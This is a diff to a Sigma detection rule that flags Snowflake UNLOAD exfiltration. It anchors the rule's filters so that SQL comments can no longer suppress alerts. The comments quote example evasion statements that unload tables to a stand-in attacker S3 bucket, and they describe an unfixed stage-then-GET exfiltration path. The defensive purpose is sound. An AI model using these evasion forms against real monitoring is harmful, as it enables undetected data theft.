@@ -21,6 +21,7 @@ references:
   - https://github.com/dotgibson/htpx/blob/main/entries/blue/snowflake-exfil-audit.md
 author: dotfiles-Defense
 date: 2026-07-02
+modified: 2026-09-28
 tags:
   - attack.exfiltration
   - attack.t1567.002
@@ -31,15 +32,27 @@ detection:
   selection_unload:
     query_type: 'UNLOAD'
   filter_internal_stages:
-    query_text|contains:
-      - '@%'   # table stage (COPY INTO @%table)
-      - '@~'   # user stage (COPY INTO @~)
+    # ANCHORED to the start of the statement. `query_text|contains: '@~'` was satisfied by
+    # a SQL comment, so `COPY INTO 's3://attacker/x' FROM t /* @~ */` - an external unload -
+    # was suppressed as internal. startswith (case-insensitive in Sigma) only exempts a
+    # statement that really unloads INTO a user or table stage. Anything it does not
+    # recognise (a leading comment, doubled whitespace) fails toward an alert, not silence.
+    # Still open, recorded rather than fixed: COPY INTO @~ followed by GET is the
+    # stage-then-download exfil path; catching it needs a correlation of the UNLOAD with a
+    # later GET by the same user, which this single-event rule cannot express.
+    query_text|startswith:
+      - 'COPY INTO @%'   # table stage (COPY INTO @%table)
+      - 'COPY INTO @~'   # user stage (COPY INTO @~)
   filter_known_stages:
     # DEPLOY-REQUIRED: add your sanctioned named stages / destination buckets. Until
     # filled this excludes only the example, so a named INTERNAL stage will alert - list
     # yours here to cut that noise. Run detections/sigma/deploy-required.sh to find this.
-    query_text|contains:
-      - 'MY_SANCTIONED_STAGE'   # example — replace with your known-good stage names
+    # ANCHORED like filter_internal_stages above, one entry per destination: a `contains`
+    # here was satisfied by the stage name in a SQL comment, so
+    # `COPY INTO 's3://attacker/x' FROM t /* MY_SANCTIONED_STAGE */` passed as sanctioned.
+    # Write each entry as the statement starts, e.g. `COPY INTO 's3://sanctioned-bucket/`.
+    query_text|startswith:
+      - 'COPY INTO @MY_SANCTIONED_STAGE'   # example — replace with your known-good stages
   condition: selection_unload and not 1 of filter_*
 falsepositives:
   - Unloads to a named INTERNAL stage (not `@%`/`@~`) - indistinguishable from external
